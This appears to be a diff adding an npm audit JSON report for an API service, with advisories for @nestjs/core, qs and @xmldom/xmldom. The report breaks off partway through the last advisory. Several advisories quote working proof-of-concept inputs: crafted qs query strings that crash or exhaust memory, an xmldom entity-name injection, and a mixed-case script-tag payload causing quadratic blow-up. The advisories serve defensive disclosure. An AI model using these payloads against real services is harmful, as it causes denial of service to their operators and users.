@@ -1,0 +1,1062 @@
+{
+  "actions": [
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1158517,
+          "path": "services__api>docxtemplater>@xmldom/xmldom",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1193671,
+          "path": "services__api>docxtemplater>@xmldom/xmldom",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1193687,
+          "path": "services__api>docxtemplater>@xmldom/xmldom",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1193690,
+          "path": "services__api>docxtemplater>@xmldom/xmldom",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1193693,
+          "path": "services__api>docxtemplater>@xmldom/xmldom",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1193695,
+          "path": "services__api>docxtemplater>@xmldom/xmldom",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1193699,
+          "path": "services__api>docxtemplater>@xmldom/xmldom",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1193701,
+          "path": "services__api>docxtemplater>@xmldom/xmldom",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1193702,
+          "path": "services__api>docxtemplater>@xmldom/xmldom",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1193704,
+          "path": "services__api>docxtemplater>@xmldom/xmldom",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1193707,
+          "path": "services__api>docxtemplater>@xmldom/xmldom",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1193711,
+          "path": "services__api>docxtemplater>@xmldom/xmldom",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1193714,
+          "path": "services__api>docxtemplater>@xmldom/xmldom",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "@xmldom/xmldom",
+      "target": "0.9.12",
+      "depth": 3
+    },
+    {
+      "action": "review",
+      "module": "@nestjs/core",
+      "resolves": [
+        {
+          "id": 1117063,
+          "path": "services__api>@nestjs/core",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "qs",
+      "resolves": [
+        {
+          "id": 1158506,
+          "path": "services__api>@nestjs/platform-express>body-parser>qs",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1158506,
+          "path": "services__api>@nestjs/platform-express>express>qs",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1158507,
+          "path": "services__api>@nestjs/platform-express>body-parser>qs",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1158507,
+          "path": "services__api>@nestjs/platform-express>express>qs",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "sharp",
+      "resolves": [
+        {
+          "id": 1193725,
+          "path": "services__api>sharp",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "multer",
+      "resolves": [
+        {
+          "id": 1193790,
+          "path": "services__api>@nestjs/platform-express>multer",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1193791,
+          "path": "services__api>@nestjs/platform-express>multer",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1193792,
+          "path": "services__api>@nestjs/platform-express>multer",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1193793,
+          "path": "services__api>@nestjs/platform-express>multer",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1117063": {
+      "findings": [
+        {
+          "version": "10.4.22",
+          "paths": [
+            "services/api > @nestjs/core@10.4.22 > @nestjs/platform-express@10.4.22 > @nestjs/core@10.4.22",
+            "services/api > @nestjs/platform-express@10.4.22 > @nestjs/core@10.4.22"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nestjs/nest/security/advisories/GHSA-36xv-jgw5-4q75\n- https://github.com/nestjs/nest/pull/16686\n- https://github.com/nestjs/nest/commit/83558ae774a990a7916141d3abe0b6548ff3a8b2\n- https://github.com/nestjs/nest/releases/tag/v11.1.18\n- https://nvd.nist.gov/vuln/detail/CVE-2026-35515\n- https://github.com/advisories/GHSA-36xv-jgw5-4q75",
+      "created": "2026-04-06T17:59:51.000Z",
+      "id": 1117063,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n_What kind of vulnerability is it? Who is impacted?_\n\n[`SseStream._transform()`](https://github.com/nestjs/nest/blob/dea5279ef8fcb568de158003e4281759a2cd7675/packages/core/router/sse-stream.ts) interpolates `message.type` and `message.id` directly into Server-Sent Events text protocol output without sanitizing newline characters (`\\r`, `\\n`). Since the SSE protocol treats both `\\r` and `\\n` as field delimiters and `\\n\\n` as event boundaries, an attacker who can influence these fields through upstream data sources can inject arbitrary SSE events, spoof event types, and corrupt reconnection state. Spring Framework's own security patch ([6e97587](https://github.com/spring-projects/spring-framework/commit/6e9758700a4946be1dca85ca937ef2603e291301)) validates these same fields (`id`, `event`) for the same reason.\n\nActual impact:\n\n- **Event spoofing**: Attacker forges SSE events with arbitrary `event:` types, causing client-side `EventSource.addEventListener()` callbacks to fire for wrong event types.\n- **Data injection**: Attacker injects arbitrary `data:` payloads, potentially triggering XSS if the client renders SSE data as HTML without sanitization.\n- **Reconnection corruption**: Attacker injects `id:` fields, corrupting the `Last-Event-ID` header on reconnection, causing the client to miss or replay events.\n- **Attack precondition**: Requires the developer to map user-influenced data to the `type` or `id` fields of SSE messages. Direct HTTP request input does not reach these fields without developer code bridging the gap.\n-\n### Patches\n_Has the problem been patched? What versions should users upgrade to?_\n\nPatched in `@nestjs/core@11.1.18`",
+      "reported_by": null,
+      "title": "@nestjs/core Improperly Neutralizes Special Elements in Output Used by a Downstream Component ('Injection')",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-35515"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "@nestjs/core",
+      "vulnerable_versions": "<=11.1.17",
+      "github_advisory_id": "GHSA-36xv-jgw5-4q75",
+      "recommendation": "Upgrade to version 11.1.18 or later",
+      "patched_versions": ">=11.1.18",
+      "updated": "2026-04-24T20:46:24.000Z",
+      "cvss": {
+        "score": 6.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-74"
+      ],
+      "url": "https://github.com/advisories/GHSA-36xv-jgw5-4q75"
+    },
+    "1158506": {
+      "findings": [
+        {
+          "version": "6.15.3",
+          "paths": [
+            "services/api > @nestjs/core@10.4.22 > @nestjs/platform-express@10.4.22 > body-parser@1.20.6 > qs@6.15.3",
+            "services/api > @nestjs/core@10.4.22 > @nestjs/platform-express@10.4.22 > express@4.22.1 > body-parser@1.20.6 > qs@6.15.3",
+            "services/api > @nestjs/platform-express@10.4.22 > body-parser@1.20.6 > qs@6.15.3",
+            "services/api > @nestjs/platform-express@10.4.22 > express@4.22.1 > body-parser@1.20.6 > qs@6.15.3"
+          ]
+        },
+        {
+          "version": "6.15.2",
+          "paths": [
+            "services/api > @nestjs/core@10.4.22 > @nestjs/platform-express@10.4.22 > express@4.22.1 > qs@6.15.2",
+            "services/api > @nestjs/platform-express@10.4.22 > express@4.22.1 > qs@6.15.2"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/ljharb/qs/security/advisories/GHSA-w7fw-mjwx-w883\n- https://github.com/ljharb/qs/security/advisories/GHSA-x5fp-wj9c-mxmx\n- https://nvd.nist.gov/vuln/detail/CVE-2026-82562\n- https://github.com/ljharb/qs/commit/8859c37470e11b42b547b275e4e9bd0bc8cc5464\n- https://github.com/advisories/GHSA-x5fp-wj9c-mxmx",
+      "created": "2026-09-02T14:46:57.000Z",
+      "id": 1158506,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`qs` `v6.15.3` allows bracket-key input to bypass `arrayLimit` and `throwOnLimitExceeded` when `comma: true`. The input `a[]=1,2,3,4` succeeds with `arrayLimit: 3`, while the equivalent plain-key input is rejected.\n\nAffected version tested:\n\n```text\nqs v6.15.3\ncommit 18d085e919dae70c8f1b200ab99323058edab2c2\n```\n\n### Details\n\n`parseArrayValue()` enforces the comma limit only for flat values. The `a[]` form is marked non-flat, so its comma-separated value is wrapped after parsing and the inner array is not checked. A single parameter can therefore materialize arbitrarily large arrays.\n\n### PoC\n\n```js\nconst qs = require('qs')\nconst options = { comma: true, arrayLimit: 3, throwOnLimitExceeded: true }\n\nconst result = qs.parse('a[]=1,2,3,4', options)\nconsole.log(result.a[0].length) // 4; expected RangeError\n\nconst big = qs.parse('a[]=' + '1,'.repeat(1000000) + '1', { comma: true, arrayLimit: 20 })\nconsole.log(big.a[0].length) // 1000001\n```\n\nOn `v6.15.3`, the first input parses successfully and the second creates an array with 1,000,001 elements. The equivalent `a=1,2,3,4` input throws `RangeError` as expected.\n\n### Impact\n\nAn attacker who can supply a query string or form body can bypass configured array limits and force excessive memory allocation, causing denial of service. The limit must be applied after comma splitting and before the resulting array is wrapped.",
+      "reported_by": null,
+      "title": "qs array-limit bypass via bracket-key comma parsing",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-82562"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "qs",
+      "vulnerable_versions": ">=6.14.2 <=6.15.3",
+      "github_advisory_id": "GHSA-x5fp-wj9c-mxmx",
+      "recommendation": "Upgrade to version 6.16.0 or later",
+      "patched_versions": ">=6.16.0",
+      "updated": "2026-09-02T14:46:58.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-x5fp-wj9c-mxmx"
+    },
+    "1158507": {
+      "findings": [
+        {
+          "version": "6.15.3",
+          "paths": [
+            "services/api > @nestjs/core@10.4.22 > @nestjs/platform-express@10.4.22 > body-parser@1.20.6 > qs@6.15.3",
+            "services/api > @nestjs/core@10.4.22 > @nestjs/platform-express@10.4.22 > express@4.22.1 > body-parser@1.20.6 > qs@6.15.3",
+            "services/api > @nestjs/platform-express@10.4.22 > body-parser@1.20.6 > qs@6.15.3",
+            "services/api > @nestjs/platform-express@10.4.22 > express@4.22.1 > body-parser@1.20.6 > qs@6.15.3"
+          ]
+        },
+        {
+          "version": "6.15.2",
+          "paths": [
+            "services/api > @nestjs/core@10.4.22 > @nestjs/platform-express@10.4.22 > express@4.22.1 > qs@6.15.2",
+            "services/api > @nestjs/platform-express@10.4.22 > express@4.22.1 > qs@6.15.2"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/ljharb/qs/security/advisories/GHSA-4mjr-xmp4-gh2g\n- https://nvd.nist.gov/vuln/detail/CVE-2026-82417\n- https://github.com/ljharb/qs/commit/e83d321ffafb38cf210683ac31714fce6ce1c6c6\n- https://github.com/advisories/GHSA-4mjr-xmp4-gh2g",
+      "created": "2026-09-02T14:45:13.000Z",
+      "id": 1158507,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`qs.stringify()` calls `utils.isBuffer()` on every value it serializes, and `utils.isBuffer()` invokes `obj.constructor.isBuffer(obj)` without checking that it is callable. A value whose own `constructor.isBuffer` is a non-function makes `qs` call a non-callable and throw `TypeError`. Such a value is produced **by `qs.parse` itself** from an untrusted query string when `plainObjects: true` or `allowPrototypes: true` is set, so a pure-`qs` `parse` → `stringify` round-trip — no `JSON.parse` — turns an unauthenticated query string into an uncaught throw.\n\nAn attacker-controlled `parse` input reaches the host application's availability asset — via `qs`'s own recommended `plainObjects` mitigation — and triggers an uncaught exception during a `parse` → `stringify` round-trip.\n\n### Details\n`utils.isBuffer` runs at `lib/stringify.js:127` for every serialized value:\n\n```js\nif (isNonNullishPrimitive(obj) || utils.isBuffer(obj)) { ... }\n```\n\n`utils.isBuffer` (`lib/utils.js:327-333`) invokes `obj.constructor.isBuffer` without verifying it is callable:\n\n```js\nvar isBuffer = function isBuffer(obj) {\n    if (!obj || typeof obj !== 'object') { return false; }\n    return !!(obj.constructor && obj.constructor.isBuffer && obj.constructor.isBuffer(obj));\n};\n```\n\n`constructor` and `isBuffer` are ordinary keys. `qs.parse` with `plainObjects: true` or `allowPrototypes: true` keeps them as own properties, so the parsed value carries a non-function `constructor.isBuffer`; `stringify` then calls a non-callable and throws `TypeError`. By contrast `utils.isRegExp` uses a brand check (`Object.prototype.toString`); the missing guard here is an internal inconsistency, not a platform limitation.\n\n\n### Trust Boundary Note\n\n`qs.stringify` alone treats its input as caller-constructed, so serializing a hostile object could be argued outside its contract. This report does not depend on that framing: the malicious shape is produced by **`qs.parse`, whose input is untrusted by design**. `qs.parse` normally strips a `constructor` key via its prototype guard, but with the documented options `plainObjects: true` or `allowPrototypes: true` the key survives and lands as an own property. Feeding the parsed object back into `qs.stringify` — the standard round-trip in gateways and request-forwarders — then hits the unchecked call. \n\n\n### PoC\n`poc02c_isBuffer_qs_only_roundtrip.js` — pure-`qs` chain, no `JSON.parse`; an untrusted query string alone reaches the throw:\n\n```js\n'use strict';\nvar qs = require('qs');\n\nvar untrustedQueryString = 'x%5Bconstructor%5D%5BisBuffer%5D=y'; // x[constructor][isBuffer]=y\n\nvar parsed = qs.parse(untrustedQueryString, { plainObjects: true });\nconsole.log('[parse] kept constructor key:', JSON.stringify(parsed));\n\ntry {\n    qs.stringify(parsed);\n    console.log('[stringify] no throw (unexpected)');\n} catch (e) {\n    console.log('[stringify] DoS reproduced ->', e.constructor.name + ':', e.message);\n}\n```\n\n`poc02_isBuffer.js` — the minimal defect:\n\n```js\n'use strict';\nvar qs = require('qs');\ntry {\n    qs.stringify(JSON.parse('{\"a\":{\"constructor\":{\"isBuffer\":\"x\"}}}'));\n} catch (e) {\n    console.log('[A] DoS reproduced ->', e.constructor.name + ':', e.message);\n}\n```\n\n`poc02b_isBuffer_async_crash.js` — worker death in an async sink:\n\n```js\n'use strict';\nvar qs = require('qs');\n\nfunction handleRequestAsync(clientJsonBody) {\n    try {\n        setImmediate(function () {                 // async continuation, outside the try\n            qs.stringify(JSON.parse(clientJsonBody)); // throws here, uncaught\n        });\n        console.log('[handler] returned 200 synchronously; async work scheduled');\n    } catch (e) {\n        console.log('[handler] caught synchronously (will NOT happen):', e.message);\n    }\n}\nprocess.on('exit', function (code) {\n    console.log('[proc] process exiting with code:', code);\n});\nhandleRequestAsync('{\"filters\":{\"constructor\":{\"isBuffer\":\"x\"}}}');\n```\n\n### Execution Steps\n\n```bash\ncd poc\nnpm install qs@6.15.3\nnode poc02c_isBuffer_qs_only_roundtrip.js  # pure qs parse->stringify -> TypeError\nnode poc02_isBuffer.js                      # minimal defect -> TypeError inside stringify\nnode poc02b_isBuffer_async_crash.js         # async sink -> uncaught throw -> exit code 1\n```\n\n### Reproduction Evidence\n\n`poc02c_isBuffer_qs_only_roundtrip.js` :\n\n```\n[parse] kept constructor key: {\"x\":{\"constructor\":{\"isBuffer\":\"y\"}}}\n[stringify] DoS reproduced -> TypeError: obj.constructor.isBuffer is not a function\n```\n\n`poc02_isBuffer.js`:\n\n```\n[A] DoS reproduced -> TypeError: obj.constructor.isBuffer is not a function\n```\n\n`poc02b_isBuffer_async_crash.js` :\n\n```\n[handler] returned 200 synchronously; async work scheduled\n[proc] process exiting with code: 1\nTypeError: obj.constructor.isBuffer is not a function\n    at Object.isBuffer (.../qs/lib/utils.js:332:78)\n    at stringify (.../qs/lib/stringify.js:127:45)\n=== EXIT CODE: 1 ===\n```\n\nThe pure-`qs` round-trip shows the malicious shape originates from `qs.parse` of an untrusted query string, with no `JSON.parse`. The synchronous `try/catch` in the async case does not catch the throw; the process exits with code 1, denying service to all requests on that worker.\n\n### Impact\n\nAn unauthenticated request degrades any endpoint that re-serializes deserialized client data with `qs.stringify`. The primary impact is a per-request failure: the handler throws and the framework returns HTTP 500. Where the call sits in an unguarded async continuation, the throw escapes and the worker process exits, denying service to all requests it was handling, which means a higher impact that depends on the application's error handling, not on `qs`.\n\n### Recommended Fix\n\nReplace the duck-type with a brand check mirroring `utils.isRegExp`:\n\n```js\nvar isBuffer = function isBuffer(obj) {\n    if (!obj || typeof obj !== 'object') { return false; }\n    if (typeof Buffer !== 'undefined' && typeof Buffer.isBuffer === 'function') {\n        return Buffer.isBuffer(obj);\n    }\n    return Object.prototype.toString.call(obj) === '[object Uint8Array]';\n};\n```\n\nIf duck-typing must remain, require `typeof obj.constructor.isBuffer === 'function'` before invoking and wrap the call in `try/catch`.",
+      "reported_by": null,
+      "title": "qs: Denial of Service via Attacker Controlled isBuffer",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-82417"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "qs",
+      "vulnerable_versions": ">=2.2.5 <6.16.0",
+      "github_advisory_id": "GHSA-4mjr-xmp4-gh2g",
+      "recommendation": "Upgrade to version 6.16.0 or later",
+      "patched_versions": ">=6.16.0",
+      "updated": "2026-09-02T14:45:15.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-248",
+        "CWE-703"
+      ],
+      "url": "https://github.com/advisories/GHSA-4mjr-xmp4-gh2g"
+    },
+    "1158517": {
+      "findings": [
+        {
+          "version": "0.9.10",
+          "paths": [
+            "services/api > docxtemplater@3.69.0 > @xmldom/xmldom@0.9.10"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/xmldom/xmldom/security/advisories/GHSA-6gmq-8vp8-gcm6\n- https://nvd.nist.gov/vuln/detail/CVE-2026-83610\n- https://github.com/xmldom/xmldom/pull/1071\n- https://github.com/xmldom/xmldom/pull/1072\n- https://github.com/xmldom/xmldom/commit/4664386e4f4d99d17b416a151dbe8323e245284b\n- https://github.com/xmldom/xmldom/commit/6c3fb5ffeafe7901ec928ce9010988dd716c94a0\n- https://github.com/xmldom/xmldom/releases/tag/0.8.15\n- https://github.com/xmldom/xmldom/releases/tag/0.9.12\n- https://github.com/advisories/GHSA-6gmq-8vp8-gcm6",
+      "created": "2026-09-02T15:18:20.000Z",
+      "id": 1158517,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nAn `EntityReference` node can be created with an invalid, attacker-controlled name through `Document.createEntityReference(name)`. When this node is serialized directly with:\n\n```js\nserializer.serializeToString(ref, { requireWellFormed: true })\n```\n\nthe invalid `nodeName` is emitted into the serialized XML fragment without validation or escaping.\n\nThis can produce real XML markup in the serialized output. In the proof of concept below, the serialized fragment contains `<injected/>`, and reparsing the fragment creates a real `injected` element.\n\n---\n\n## Details\n\nThe issue appears to be in the serialization path for `ENTITY_REFERENCE_NODE`.\n\nFor several other node types, `requireWellFormed: true` performs specific validation checks before serialization. For example, comments, processing instructions, document types, and some character data cases are checked before being emitted.\n\nHowever, for `ENTITY_REFERENCE_NODE`, the serializer appears to emit the node name directly in entity reference form:\n\n```js\ncase ENTITY_REFERENCE_NODE:\n  buf.push('&', n.nodeName, ';');\n  return null;\n```\n\nAs a result, if `nodeName` contains characters that break out of the intended `&name;` structure, the serializer can emit additional XML markup.\n\nFor example, an entity reference created with the name:\n\n```text\nsafe; <injected/> &x\n```\n\nis serialized as:\n\n```xml\n&safe; <injected/> &x;\n```\n\nWhen this fragment is later parsed in an XML context, `<injected/>` becomes a real element.\n\nThis is especially surprising when `{ requireWellFormed: true }` is used, because applications may reasonably treat this mode as the stricter or safer XML serialization mode.\n\n---\n\n## Proof of Concept\n\nTested with:\n\n```text\n@xmldom/xmldom@0.9.10\nNode.js v24.18.0\nWindows 10 / PowerShell\n```\n\n```js\n'use strict';\n\nconst { DOMImplementation, XMLSerializer, DOMParser } = require('@xmldom/xmldom');\n\nconst impl = new DOMImplementation();\nconst doc = impl.createDocument(null, 'root', null);\nconst serializer = new XMLSerializer();\n\nfunction countInjected(fragment) {\n  try {\n    const parsed = new DOMParser().parseFromString(`<root>${fragment}</root>`, 'application/xml');\n    return parsed.getElementsByTagName('injected').length;\n  } catch (e) {\n    return `PARSE_THROW ${e.name}: ${e.message}`;\n  }\n}\n\nfor (const name of [\n  'safe',\n  'safe; <injected/> &x',\n  'x<injected',\n  'x y'\n]) {\n  try {\n    const ref = doc.createEntityReference(name);\n    const xml = serializer.serializeToString(ref, { requireWellFormed: true });\n\n    console.log(`[SERIALIZED] ${JSON.stringify(name)}: ${xml}`);\n    console.log(`[INJECTED_COUNT] ${JSON.stringify(name)}: ${countInjected(xml)}`);\n  } catch (e) {\n    console.log(`[THROW] ${JSON.stringify(name)}: ${e.name}: ${e.message}`);\n  }\n}\n```\n\nObserved output:\n\n```text\n[SERIALIZED] \"safe\": &safe;\n[INJECTED_COUNT] \"safe\": 0\n\n[SERIALIZED] \"safe; <injected/> &x\": &safe; <injected/> &x;\n[INJECTED_COUNT] \"safe; <injected/> &x\": 1\n\n[SERIALIZED] \"x<injected\": &x<injected;\n[INJECTED_COUNT] \"x<injected\": 0\n\n[SERIALIZED] \"x y\": &x y;\n[INJECTED_COUNT] \"x y\": 0\n```\n\n---\n\n## Impact\n\nAn application that creates an `EntityReference` from attacker-controlled input and then serializes that node or XML fragment with `requireWellFormed: true` may produce XML containing attacker-controlled markup.\n\nThe impact is limited by two observations:\n\n1. The parser does not create `EntityReference` nodes from ordinary XML entity references.\n2. Appending an `EntityReference` node as an element child is rejected with a `HierarchyRequestError`.\n\nThe main affected scenario is applications that directly use `createEntityReference(name)` and then serialize the resulting node or fragment.\n\n## Fix Applied\n\nTwo complementary, non-breaking fixes.\n(1) `document.createEntityReference(name)` rejects an invalid `Name` at creation, closing the reachable creation vector by default — the opt-in serializer check alone cannot, since a later `nodeName` mutation would bypass a creation-only guard.\n(2) Under `requireWellFormed`, the serializer validates the `EntityReference` `nodeName` as a well-formed XML `Name` and throws `InvalidStateError` when it is not; a valid reference still serializes as `&name;`. Both ship on both maintained versions. The `EntityReference` / `createEntityReference` docs note that under `requireWellFormed` the `nodeName` is validated as an XML `Name`, and that xmldom does not expand entities. See the [XML `Name` production](https://www.w3.org/TR/xml/#NT-Name).\n> **⚠ Opt-in required.** Protection is not automatic. Existing serialization calls remain\n> vulnerable unless `{ requireWellFormed: true }` is explicitly passed. Applications that\n> serialize untrusted DOM content should audit all `serializeToString()` call sites and add it.\n\n### Proof of Concept - fixed path\n\n```js\n'use strict';\n\nconst { DOMImplementation, XMLSerializer } = require('@xmldom/xmldom');\n\nconst impl = new DOMImplementation();\nconst doc = impl.createDocument(null, 'root', null);\nconst serializer = new XMLSerializer();\n\n// Creation-time anchor (applied by default): an invalid XML Name is rejected at creation.\ntry {\n  doc.createEntityReference('safe; <injected/> &x');\n} catch (e) {\n  console.log(`${e.name}`); // rejected at creation\n}\n\n// Default path (requireWellFormed omitted): because creation now rejects an ill-formed name,\n// an ill-formed nodeName is only reachable via a post-creation mutation — and is emitted verbatim.\nconst ref = doc.createEntityReference('safe');\nref.nodeName = 'safe; <injected/> &x';\nconsole.log(serializer.serializeToString(ref));\n// -> &safe; <injected/> &x;   (injection present on the default path)\n\n// Opt-in path: throws on the invalid nodeName.\ntry {\n  serializer.serializeToString(ref, { requireWellFormed: true });\n} catch (e) {\n  console.log(`${e.name}`); // InvalidStateError\n}\n\n// A valid name still serializes as &name; under requireWellFormed.\nconst ok = doc.createEntityReference('valid');\nconsole.log(serializer.serializeToString(ok, { requireWellFormed: true }));\n// -> &valid;\n```\n\n### Why the default stays verbatim\n\nThe creation-time anchor is applied by default, because it is classified non-breaking. The serializer check, by contrast, stays gated behind `{ requireWellFormed: true }`: W3C DOM Parsing's require-well-formed flag defaults to `false`, and the browser `XMLSerializer` emits the `nodeName` verbatim in that default mode, so unconditionally throwing for an ill-formed `EntityReference.nodeName` would be an unjustified breaking change — which is why the default serialization path stays verbatim.\n\n### Residual limitation\n\nThe creation vector is closed by default — the non-breaking creation-time anchor — with no further deferred work. The residual is at serialization: the default path still emits an ill-formed `nodeName` verbatim, because the serializer check is opt-in via `{ requireWellFormed: true }`.",
+      "reported_by": null,
+      "title": "xmldom: XML fragment injection via invalid EntityReference.nodeName during requireWellFormed serialization",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-83610"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "@xmldom/xmldom",
+      "vulnerable_versions": ">=0.9.0 <=0.9.11",
+      "github_advisory_id": "GHSA-6gmq-8vp8-gcm6",
+      "recommendation": "Upgrade to version 0.9.12 or later",
+      "patched_versions": ">=0.9.12",
+      "updated": "2026-09-02T15:18:21.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-116"
+      ],
+      "url": "https://github.com/advisories/GHSA-6gmq-8vp8-gcm6"
+    },
+    "1193671": {
+      "findings": [
+        {
+          "version": "0.9.10",
+          "paths": [
+            "services/api > docxtemplater@3.69.0 > @xmldom/xmldom@0.9.10"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/xmldom/xmldom/security/advisories/GHSA-6mj3-qw4j-hgrw\n- https://nvd.nist.gov/vuln/detail/CVE-2026-83612\n- https://github.com/xmldom/xmldom/pull/1071\n- https://github.com/xmldom/xmldom/commit/7ced40c06c28d151e996a97045018c3559ae4707\n- https://github.com/xmldom/xmldom/releases/tag/0.9.12\n- https://github.com/advisories/GHSA-6mj3-qw4j-hgrw",
+      "created": "2026-09-08T20:59:54.000Z",
+      "id": 1193671,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nIn HTML mode (`text/html`), a raw-text element (`script`, `style`, `textarea`, `title`) whose closing\ntag differs in case from its opening tag (e.g. `</ScRiPt>` for `<script>`) is mishandled by the\nparser, producing quadratic (O(n²)) output growth — a small crafted document parses and serializes\ninto output orders of magnitude larger, exhausting CPU and memory. A modest input of tens of KB can\ntherefore cause a denial of service in any service that parses untrusted HTML with xmldom. Only HTML\nmode is affected.\n\n## Details\n\nThe parser calls `parseHtmlSpecialContent` for each raw-text element in HTML mode, matched via\n`isHTMLRawTextElement` / `isHTMLEscapableRawTextElement` (so all four types — `script`, `style`,\n`textarea`, `title` — are in scope). It searches for the element's closing tag with\n`source.indexOf('</' + tagName + '>', elStartEnd)`, a byte-for-byte case-sensitive match. A\nmixed-case closing tag never matches, so the search returns `-1`, and the following\n`source.substring(elStartEnd + 1, -1)` extracts text backwards from the start of the document\ninstead of the element's content. The function then returns `-1` to the parse loop, which cannot\nadvance normally and falls back to character-by-character reprocessing. Every raw-text element\nre-captures all source text preceding it, so output grows as O(n²) in the number of such elements.\n\n### Root Cause\n\n1. **Case-sensitive close-tag search** (`lib/sax.js:549`): `source.indexOf('</' + tagName + '>',\n   elStartEnd)` does not fold case, contrary to the WHATWG HTML RAWTEXT end-tag-name rule.\n2. **Unguarded `-1`** (`lib/sax.js:550`): `source.substring(elStartEnd + 1, elEndStart)` runs even\n   when `elEndStart === -1`, extracting text backwards from position 0.\n3. **Unstable progression** (`lib/sax.js:556`): the function returns `elEndStart` (`-1`), driving\n   repeated character-by-character fallback in the parse loop.\n\n## Affected Versions\n\nOnly the `0.9.x` line is affected — the amplification was introduced in `0.9.0-beta.1` when\n`parseHtmlSpecialContent` was refactored, and remains through `0.9.11`. The `0.8.x` line is **not**\naffected: its older `parseHtmlSpecialContent` does not amplify, despite sharing the same\ncase-sensitive `indexOf`.\n\n## Proof of Concept\n\n```js\nconst { DOMParser, XMLSerializer } = require('@xmldom/xmldom');\n\nconst n = 1000;\nconst payload = '<html><body>' + '<script>x</ScRiPt>'.repeat(n) + '</body></html>';\nconst doc = new DOMParser().parseFromString(payload, 'text/html');\nconst out = new XMLSerializer().serializeToString(doc);\nconsole.log(payload.length, out.length, (out.length / payload.length).toFixed(1) + 'x');\n// 18026 9037063 501.3x  — an 18 KB input yields ~9 MB of output\n```\n\nOutput size grows quadratically with the number of case-mismatched raw-text elements:\n\n```\nRepeats | Input len | Output len | Ratio\n1       | 44        | 109        | 2.5x\n100     | 1826      | 93763      | 51.3x\n500     | 9026      | 2268563    | 251.3x\n1000    | 18026     | 9037063    | 501.3x\n2000    | 36026     | 36074063   | 1001.3x\n```\n\nProof of Concept from @KarimTantawey (tested with `script`); the same amplification occurs for `style`,\n`textarea`, and `title`.\n\n## Impact\n\nSmall attacker payloads can force disproportionate CPU and memory usage in services that\nparse and serialize untrusted HTML via xmldom. The quadratic growth means a modest-sized input\n(tens of kilobytes) can produce output in the tens or hundreds of megabytes, potentially\nexhausting memory or causing timeouts.\n\nThe attack only requires HTML mode (`text/html` MIME type) and mixed-case closing tags for\nany of the four raw-text element types. No special configuration or error handler setup is needed.\n\n## Severity note\n\nThe CVSS 4.0 vector scores availability only (`VA:H`, with `VC:N/VI:N`): the flaw neither discloses\nnor corrupts data, but a small untrusted HTML input (tens of KB) can force output and memory in the\ntens to hundreds of MB, enough to exhaust a service's heap or stall its event loop. It is reachable\nwith no authentication, configuration, or error-handler setup — only that the application parses\nuntrusted `text/html` and serializes the result.\n\n## Fix Applied\n\nThe raw-text closing tag is now matched case-insensitively in HTML raw-text mode (per the WHATWG HTML\n[RAWTEXT end-tag 